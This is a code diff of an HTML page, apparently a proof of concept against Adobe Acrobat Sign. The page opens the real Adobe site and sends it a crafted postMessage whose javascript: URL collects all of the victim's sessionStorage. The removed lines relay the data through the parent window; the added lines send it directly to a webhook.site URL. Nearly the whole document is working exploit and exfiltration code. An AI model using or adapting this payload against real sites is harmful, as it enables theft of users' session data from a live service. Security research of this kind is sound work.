@@ -27,49 +27,33 @@
 
     <script>
       let childWindow = null;
-      let webhookUrl = 'https://webhook.site/3444004f-f792-4702-8e8f-65bbc886712f'; // Paste your webhook.site URL here
-
-      // Listen for messages from the child window
-      window.addEventListener('message', (event) => {
-        // Check if this is our sessionStorage data
-        if (event.data && event.data.sessionStorageData) {
-          console.log('Received sessionStorage data:', event.data.sessionStorageData);
-          
-          // Send to webhook.site from parent window (no CORS issues!)
-          fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(event.data.sessionStorageData)
-          })
-          .then(response => {
-            console.log('Successfully sent to webhook.site!', response.status);
-          })
-          .catch(error => {
-            console.error('Error sending to webhook:', error);
-          });
-        }
-      });
-
+      let webhookUrl = 'https://webhook.site/3444004f-f792-4702-8e8f-65bbc886712f';
+      
       document.getElementById('openButton').addEventListener('click', () => {
-        childWindow = window.open(document.getElementById('url').value, '_blank');
-        if (childWindow) {
-          setTimeout(() => {
-            if (childWindow && !childWindow.closed) {
-              const message = JSON.stringify({
-                app: 'ucv3',
-                subType: 'EXTERNAL',
-                data: {
-                  externalUrl: `javascript:(function(){let data={};for(let i=0;i<sessionStorage.length;i++){let k=sessionStorage.key(i);data[k]=sessionStorage.getItem(k);}window.opener.postMessage({sessionStorageData:data},'*');})();`,
-                  target: '_blank'
-                }
-              });
-              childWindow.postMessage(message, '*');
-            }
-          }, 14000);
-        }
+      childWindow = window.open('https://www.adobe.com/acrobat/business/sign.html?fromES=true#mini-plans-web-cta-acrobat-pro-teams-card', '_blank');
+      if (childWindow) {
+      setTimeout(() => {
+        console.log('message sent');
+      if (childWindow && !childWindow.closed) {
+      const message = JSON.stringify({
+      app: 'ucv3',
+      subType: 'EXTERNAL',
+      data: {
+      externalUrl: `javascript:(function(){let data={};for(let i=0;i<sessionStorage.length;i++)
+      
+      {let k=sessionStorage.key(i);data[k]=sessionStorage.getItem(k);}
+      fetch("${webhookUrl}",
+      
+      {method:"POST",body:JSON.stringify(data)}
+      );})();`,
+      target: '_blank'
+      }
       });
-    </script>
-  </body>
-</html>
+      childWindow.postMessage(message, '*');
+      }
+      }, 14000);
+      }
+      });
+      </script>
+      </body>
+      </html>
